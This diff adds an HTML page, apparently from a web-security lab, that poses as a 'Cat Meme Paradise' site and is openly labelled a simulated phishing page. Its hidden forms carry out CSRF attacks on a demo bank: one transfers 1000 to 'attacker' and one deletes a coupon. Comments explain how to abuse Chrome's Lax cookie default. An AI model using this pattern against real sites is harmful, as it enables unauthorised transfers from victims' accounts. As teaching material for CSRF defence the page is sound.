@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cat Meme Paradise</title>
+    <style>
+        body {
+            background: #f7f7fa;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            text-align: center;
+        }
+        .cat-meme {
+            display: inline-block;
+            margin: 20px;
+            border: 3px solid #ff69b4;
+            border-radius: 12px;
+            background: #fff;
+            box-shadow: 0 2px 8px #ccc;
+            width: 320px;
+        }
+        .cat-meme img {
+            width: 100%;
+            border-radius: 12px 12px 0 0;
+        }
+        .meme-text {
+            font-size: 1.1em;
+            color: #ff69b4;
+            padding: 10px;
+        }
+        h1 {
+            color: #ff69b4;
+        }
+        form {
+            margin: 30px auto;
+            max-width: 350px;
+            background: #fffbe7;
+            border: 2px dashed #ff69b4;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        button {
+            background: #ff69b4;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #ff1493;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p style="background-color: #a63838; border: 2px solid #e43d3d; padding: 15px; border-radius: 8px; margin-bottom: 30px; text-align: center; font-weight: bold;">
+            <strong style="color: #ff4444;">⚠️ PHISHING PAGE ⚠️</strong><br>
+            This is a simulated phishing page that an attacker would send to a victim. 
+            In a real attack, this page would be hosted on a malicious domain.
+        </p>
+
+        <h1>😺 Cat Meme Paradise 😺</h1>
+    <div>
+        <div class="cat-meme">
+            <img src="https://cataas.com/cat/says/Hello%20Human!" alt="Cat Meme 1">
+            <div class="meme-text">"Am I cute or what?"</div>
+        </div>
+        <div class="cat-meme">
+            <img src="https://cataas.com/cat/says/Click%20the%20Button%20to%20adopt%20me!" alt="Cat Meme 2">
+            <div class="meme-text">"Cat Distribution System!"</div>
+        </div>
+        <div class="cat-meme">
+            <img src="https://cataas.com/cat/says/Click%20the%20button!" alt="Cat Meme 3">
+            <div class="meme-text">"One button click = one purr"</div>
+        </div>
+    </div>
+
+    <!-- Sends a POST request with top level navigation. Will work if cookie is set to 
+    LAX and was created < 2 mins. -->
+    <!-- Chrome will set the cookie as LAX implicitly if not defined as LAX in the backend. You have
+    ~ 2 minutes to do the transfer. -->
+    <form id="csrfForm" method="POST" action="http://double-submit-bank.com/transfer">
+        <input type="hidden" id="to" name="to" value="attacker">
+        <input type="hidden" id="amount" name="amount" value="1000">
+        <input type="hidden" id="coupon" name="coupon" value="">
+        <input type="hidden" name="csrfToken" value="">
+        <button type="submit">Free money!</button>
+    </form>
+
+    <!-- Sends a GET request with top level navigation. This will work as the GET request is safe for LAX cookies
+    and top level navigation also occurs. -->
+    <form id="deleteCouponForm" method="GET" action="http://double-submit-bank.com/delete-coupon">
+        <input type="hidden" id="code" name="code" value="ALICE50">
+        <input type="hidden" name="csrfToken" value="">
+        <button type="submit" id="deleteCoupon">Free phone!</button>
+    </form>
+</body>
+</html>
